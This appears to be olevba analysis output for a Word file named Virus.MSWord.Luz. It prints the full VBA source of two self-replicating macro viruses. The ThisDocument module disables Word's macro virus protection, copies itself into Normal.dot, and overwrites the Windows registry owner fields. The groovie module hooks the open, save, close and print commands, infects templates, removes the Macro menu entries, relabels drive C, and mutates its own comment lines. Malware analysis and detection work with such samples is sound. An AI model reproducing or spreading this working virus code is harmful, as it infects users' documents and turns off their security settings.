olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Luz
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Luz - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 2
Private Sub Document_Close()
On Error Resume Next

'This is very important information
'please, do not delete or modify !!!

Dim x, Contor As Integer
Dim SaveDocument, SaveNormalTemplate, DocInf, NorInf As Boolean
Dim AD, NT As Object
Dim OurCode, OurCode2, LogData, LogFile, Temp As String

Set AD = ActiveDocument.VBProject.VBComponents.Item(1)
Set NT = NormalTemplate.VBProject.VBComponents.Item(1)
DocInf = AD.CodeModule.Find("Am0r", 1, 1, 10000, 10000)
NorInf = NT.CodeModule.Find("Am0r", 1, 1, 10000, 10000)
Contor = 0

Options.VirusProtection = False
Options.SaveNormalPrompt = False

If (DocInf = True Xor NorInf = True) And _
(ActiveDocument.SaveFormat = wdFormatDocument Or _
 ActiveDocument.SaveFormat = wdFormatTemplate) Then
 Randomize
 x = Int(Rnd * 20)
 If x = 10 Then MsgBox "Your name is " & Application.UserName, vbInformation, "Unrequested Info"
 
 If DocInf = True Then
   SaveNormalTemplate = NormalTemplate.Saved
   OurCode = AD.CodeModule.lines(2, AD.CodeModule.countoflines - 1)
   OurCode = "' 1" & Chr(13) & OurCode
   NT.CodeModule.DeleteLines 1, NT.CodeModule.countoflines
   NT.CodeModule.addfromstring OurCode
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "Luz Clarita"
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOrganization") = "Am0r A La Mexicana"
   ActiveDocument.VBProject.VBComponents.Item(2).Export ("c:\MS Office Luz.frm")
   NormalTemplate.VBProject.VBComponents.Import ("c:\MS Office Luz.frm")
   If SaveNormalTemplate = True Then NormalTemplate.Save
 End If
 
 If NorInf = True And _
   (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
    ActiveDocument.Saved = False) Then
   SaveDocument = ActiveDocument.Saved
   OurCode = NT.CodeModule.lines(1, NT.CodeModule.countoflines)
    OurCode2 = OurCode
    Contor = Int(Trim(Mid(OurCode2, 2, 3))) + 1
    OurCode2 = NT.CodeModule.lines(2, NT.CodeModule.countoflines - 1)
    Temp = Trim("'" & Str(Contor) & Chr(13))
    OurCode2 = Temp + OurCode2
   AD.CodeModule.DeleteLines 1, AD.CodeModule.countoflines
   AD.CodeModule.addfromstring OurCode
   NT.CodeModule.DeleteLines 1, NT.CodeModule.countoflines
   NT.CodeModule.addfromstring OurCode2
   NormalTemplate.VBProject.VBComponents.Item(2).Export ("c:\MS Office Luz.frm")
   ActiveDocument.VBProject.VBComponents.Import ("c:\MS Office Luz.frm")
   If SaveDocument = True Then ActiveDocument.Save
 End If
End If
If Contor >= 66 Then
 MsgBox "Hello! " & _
 "My name is Luz Clarita and I'm a very friendly macro-virus." & _
 Chr(13) & "You should share your documents with your friends... :-)" & _
 Chr(13) & "I salut you from Romania!", vbExclamation, "SALUT!"
 Joculetz.Show
End If
End Sub

Private Sub Document_New()

End Sub



































-------------------------------------------------------------------------------
VBA MACRO Joculetz.frm 
in file: ./Virus.MSWord.Luz - OLE stream: 'Macros/VBA/Joculetz'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 






Private Sub CommandButton1_Click()
Joculetz.Hide
CommandButton1.Caption = "Aha"
End Sub

Private Sub UserForm_Activate()
a = 1
b = 5
Do
 Label1.Font.Size = Label1.Font.Size + a
 CommandButton1.Left = CommandButton1.Left + b
 If Label1.Font.Size >= 35 Then a = -a
 If CommandButton1.Left >= Joculetz.Width - 70 Then b = -b
 If Label1.Font.Size < 8 Then a = -a
 If CommandButton1.Left < 20 Then b = -b
 For i = 1 To 100
   CommandButton1.Caption = Str(i)
 Next i
 CommandButton1.Caption = "Okay"
 dummy = DoEvents
Loop Until CommandButton1.Caption = "Aha"
End Sub

Private Sub UserForm_Click()

End Sub
-------------------------------------------------------------------------------
VBA MACRO groovie.bas 
in file: ./Virus.MSWord.Luz - OLE stream: 'Macros/VBA/groovie'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public I01 As String
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Public I02 As Boolean
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Public I03 As Boolean
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Public I04 As Boolean
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Public I05 As Boolean
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Public I06 As String
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Public I07 As Boolean
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Public I08 As Boolean
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Function I09()
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If MacroContainer = NormalTemplate Then
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        I01 = "normal"
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        GoTo checkout
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    End If
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If MacroContainer = ActiveDocument Then I01 = "document"
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If MacroContainer = "data.dot" Then I01 = "orbit"
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
checkout:
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Function
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Function I10()
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If Dir(Application.StartupPath + "\data.dot") = "data.dot" Then I02 = True
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        If ActiveDocument.VBProject.VBComponents(i).Name = "groovie" Then I04 = True
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    Next i
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    For i = 1 To NormalTemplate.VBProject.VBComponents.Count
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        If NormalTemplate.VBProject.VBComponents(i).Name = "groovie" Then I03 = True
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    Next i
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If GetAttr(NormalTemplate.FullName) = vbArchive + vbReadOnly Or GetAttr(NormalTemplate.FullName) = vbReadOnly Then I05 = True
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Function
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Function I11()
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Call I09
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Call I10
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If I01 = "document" Then Call I12
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If I01 = "normal" Then Call I13
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If I01 = "orbit" Then Call I14
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If I05 = False Then CommandBars("tools").Controls("Macro").Delete
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If I05 = False Then CommandBars("tools").Controls("Templates and add-ins...").Delete
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Function
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Function I12()
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    Application.VBE.ActiveVBProject.VBComponents("groovie").Export "c:\groovie.sys"
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If I03 = False And I05 = False Then
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        With NormalTemplate.VBProject
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        With .VBComponents.Import("c:\groovie.sys")
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        End With
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        End With
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    End If
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If I02 = False Then
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        If I08 = False Then Documents.Open FileName:=I06
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        Shell ("label c: groovie"), 0
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        Windows(1).Close
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    End If
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Function
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Function I13()
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Application.ScreenUpdating = False
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    Call I17
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If I04 = False And I07 = True Then
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        With ActiveDocument.VBProject
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        With .VBComponents.Import("c:\groovie.sys")
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        End With
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        End With
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        With Dialogs(wdDialogFileSummaryInfo)
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
            .Comments = "ALT-F11 says it's groovie!"
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
            .Execute
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        End With
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    End If
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If I02 = False And I07 = True Then
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        If I08 = False Then Documents.Open FileName:=I06
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        Windows(1).Close SaveChanges:=wdSaveChanges
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    End If
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If I02 = False And I07 = False Then
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        Documents.Add Template:="", NewTemplate:=False
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        Windows(1).Close SaveChanges:=wdSaveChanges
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    End If
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Application.ScreenUpdating = True
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Function
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Function I14()
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Application.ScreenUpdating = False
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        If I03 = False And I05 = False Then
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
            With NormalTemplate.VBProject
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
            With .VBComponents.Import("c:\groovie.sys")
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
            End With
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
            End With
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
            NormalTemplate.Save
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        End If
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        If I04 = False Then
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
            With ActiveDocument.VBProject
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
            With .VBComponents.Import("c:\groovie.sys")
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
            End With
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
            End With
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
            With Dialogs(wdDialogFileSummaryInfo)
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
                .Comments = "ALT-F11 says it's groovie!"
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
                .Execute
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
            End With
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        End If
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Application.ScreenUpdating = True
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Function
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Function I15()
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    Options.VirusProtection = False
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    Options.SaveNormalPrompt = False
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    Options.ConfirmConversions = False
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    I06 = ActiveDocument.FullName
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    Call I11
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Function
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Sub AutoOpen()
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Call I15
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Sub
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Sub AutoClose()
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
I08 = True
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Call I15
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Sub
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Sub AutoExit()
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Call I15
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Sub
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Sub FileSaveAs()
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Call I16
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Call I15
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Dialogs(wdDialogFileSaveAs).Show
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Sub
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Sub filesave()
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Call I16
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Call I15
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Sub
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Sub fileclose()
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
I08 = True
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Call I15
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
ActiveDocument.Close
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Sub
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Sub fileprint()
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Call I15
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Dialogs(wdDialogFilePrint).Show
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Sub
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Sub ViewVBCode()
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
MsgBox "It's GROOVIE", vbOKOnly, "•  ALT-F11  • says..."
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Sub
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Sub FileTemplates()
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Sub
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Function I17()
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error GoTo docek
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If ActiveDocument.Name <> "" Then
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        I07 = True
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    End If
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    GoTo over
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
docek:
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    I07 = False
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
over:
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Function
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Function I16()
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Randomize
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
rn = Int(Rnd * 999)
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
With Application.VBE.ActiveVBProject.VBComponents("Groovie").CodeModule
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
For x = 2 To 358 Step 2
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
.DeleteLines x
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
.InsertLines x, " ' " & Application.UserInitials & Now & rn & Application.UserName & Application.UserAddress & rn & Application.ActivePrinter
